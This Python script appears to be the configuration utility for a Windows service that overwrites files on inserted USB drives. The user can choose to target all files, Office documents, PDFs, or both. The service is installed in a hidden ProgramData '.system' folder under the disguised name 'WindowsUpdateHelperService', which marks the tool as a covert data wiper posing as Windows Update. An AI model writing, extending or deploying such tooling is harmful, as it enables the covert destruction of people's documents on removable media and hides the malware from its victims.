#!/usr/bin/env python3
"""
USB File Overwriter - Configuration Utility
Allows users to easily change file filtering modes
"""

import os
import sys
import configparser
import subprocess

def get_service_directory():
    """Get the directory where the service is installed"""
    possible_paths = [
        os.path.join(os.environ.get('ProgramData', ''), '.system', 'WindowsUpdateHelper'),
        os.path.dirname(os.path.abspath(__file__))
    ]
    
    for path in possible_paths:
        config_file = os.path.join(path, 'config.ini')
        if os.path.exists(config_file) or os.path.exists(os.path.join(path, 'service.py')):
            return path
    
    return possible_paths[0]  # Default to installation directory

def load_current_config(config_file):
    """Load current configuration"""
    config = configparser.ConfigParser()
    current_mode = 'all'
    
    if os.path.exists(config_file):
        try:
            config.read(config_file)
            if 'FileFilter' in config:
                current_mode = config['FileFilter'].get('mode', 'all')
        except Exception as e:
            print(f"Warning: Error reading config file: {e}")
    
    return current_mode

def save_config(config_file, mode):
    """Save new configuration"""
    config = configparser.ConfigParser()
    
    config['FileFilter'] = {'mode': mode}
    config['INFO'] = {
        'description': 'USB File Overwriter Configuration',
        'valid_modes': 'all, office, pdf, office_pdf',
        'all': 'Overwrites ALL files on USB drives',
        'office': 'Overwrites only Microsoft Office files (.doc, .docx, .xls, .xlsx, .ppt, .pptx, etc.)',
        'pdf': 'Overwrites only PDF files (.pdf)',
        'office_pdf': 'Overwrites Microsoft Office files AND PDF files'
    }
    
    try:
        with open(config_file, 'w') as f:
            f.write("; USB File Overwriter Configuration\n")
            f.write("; Valid modes: all, office, pdf, office_pdf\n")
            f.write("; \n")
            f.write("; all        = Overwrites ALL files on USB drives\n")
            f.write("; office     = Overwrites only Microsoft Office files\n")
            f.write("; pdf        = Overwrites only PDF files\n")
            f.write("; office_pdf = Overwrites Office files AND PDF files\n")
            f.write("; \n")
            f.write("; After changing this file, restart the service:\n")
            f.write("; net stop WindowsUpdateHelperService\n")
            f.write("; net start WindowsUpdateHelperService\n")
            f.write("\n")
            config.write(f)
        return True
    except Exception as e:
        print(f"Error saving configuration: {e}")
        return False

def restart_service():
    """Restart the Windows service"""
    try:
        print("Stopping service...")
        subprocess.run(['net', 'stop', 'WindowsUpdateHelperService'], 
                      capture_output=True, check=False)
        
        print("Starting service...")
        result = subprocess.run(['net', 'start', 'WindowsUpdateHelperService'], 
                               capture_output=True, check=False)
        
        if result.returncode == 0:
            print("✓ Service restarted successfully!")
            return True
        else:
            print(f"Warning: Service may not have started properly. Error: {result.stderr.decode()}")
            return False
    except Exception as e:
        print(f"Error restarting service: {e}")
        return False

def get_file_extensions_info():
    """Return information about file extensions for each mode"""
    return {
        'office': [
            'Word: .doc, .docx, .docm, .dot, .dotx, .dotm',
            'Excel: .xls, .xlsx, .xlsm, .xlt, .xltx, .xltm, .xlsb',
            'PowerPoint: .ppt, .pptx, .pptm, .pot, .potx, .potm, .pps, .ppsx, .ppsm',
            'Other: .pub (Publisher), .vsd/.vsdx (Visio), .mpp (Project), .one (OneNote), .accdb/.mdb (Access)'
        ],
        'pdf': [
            'PDF: .pdf'
        ]
    }

def main():
    print("=" * 70)
    print("USB File Overwriter - Configuration Utility")
    print("=" * 70)
    print()
    
    # Check if running as administrator
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if not is_admin:
            print("WARNING: Not running as Administrator.")
            print("You may need Administrator privileges to restart the service.")
            print()
    except:
        pass
    
    # Get service directory and config file
    service_dir = get_service_directory()
    config_file = os.path.join(service_dir, 'config.ini')
    
    print(f"Service directory: {service_dir}")
    print(f"Config file: {config_file}")
    print()
    
    # Load current configuration
    current_mode = load_current_config(config_file)
    
    # Display current configuration
    print(f"Current filter mode: {current_mode.upper()}")
    print()
    
    # Display available modes
    print("Available filter modes:")
    print("  1. ALL        - Overwrites ALL files on USB drives")
    print("  2. OFFICE     - Overwrites only Microsoft Office files")
    print("  3. PDF        - Overwrites only PDF files")
    print("  4. OFFICE_PDF - Overwrites Office files AND PDF files")
    print()
    
    # Show file extensions for office and pdf modes
    extensions_info = get_file_extensions_info()
    
    print("File extensions included:")
    print("  OFFICE mode includes:")
    for ext_info in extensions_info['office']:
        print(f"    • {ext_info}")
    print()
    print("  PDF mode includes:")
    for ext_info in extensions_info['pdf']:
        print(f"    • {ext_info}")
    print()
    
    # Get user choice
    while True:
        try:
            choice = input("Select new filter mode (1-4) or 'q' to quit: ").strip().lower()
            
            if choice == 'q':
                print("Configuration unchanged.")
                return
            
            mode_map = {
                '1': 'all',
                '2': 'office', 
                '3': 'pdf',
                '4': 'office_pdf'
            }
            
            if choice in mode_map:
                new_mode = mode_map[choice]
                break
            else:
                print("Invalid choice. Please enter 1-4 or 'q'.")
                continue
                
        except KeyboardInterrupt:
            print("\nConfiguration cancelled.")
            return
    
    # Confirm change
    if new_mode == current_mode:
        print(f"Mode is already set to '{new_mode}'. No changes needed.")
        return
    
    print()
    print(f"Changing filter mode from '{current_mode}' to '{new_mode}'...")
    
    # Save new configuration
    if save_config(config_file, new_mode):
        print("✓ Configuration saved successfully!")
        
        # Ask about restarting service
        restart_choice = input("\nRestart service now to apply changes? (y/n): ").strip().lower()
        
        if restart_choice in ['y', 'yes']:
            if restart_service():
                print()
                print("=" * 70)
                print("Configuration completed successfully!")
                print(f"Filter mode is now: {new_mode.upper()}")
                print("=" * 70)
            else:
                print()
                print("Configuration saved, but service restart failed.")
                print("Please restart manually:")
                print("  net stop WindowsUpdateHelperService")
                print("  net start WindowsUpdateHelperService")
        else:
            print()
            print("Configuration saved. Remember to restart the service:")
            print("  net stop WindowsUpdateHelperService")
            print("  net start WindowsUpdateHelperService")
    else:
        print("✗ Failed to save configuration!")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nConfiguration cancelled.")
    except Exception as e:
        print(f"Error: {e}")
    
    input("\nPress Enter to exit...")